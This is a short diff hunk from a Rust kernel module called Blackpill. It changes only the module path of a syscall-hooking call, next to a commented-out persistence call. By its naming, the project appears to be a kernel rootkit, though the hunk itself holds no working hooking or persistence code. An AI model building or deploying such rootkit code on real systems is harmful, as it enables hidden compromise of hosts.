@@ -31,7 +31,7 @@ impl kernel::Module for Blackpill {
         // persistence::persist();
 
         // Hook syscalls
-        hooking::hook_syscalls();
+        hooking::syscall::hook_syscalls();
 
         Ok(Blackpill)
     }
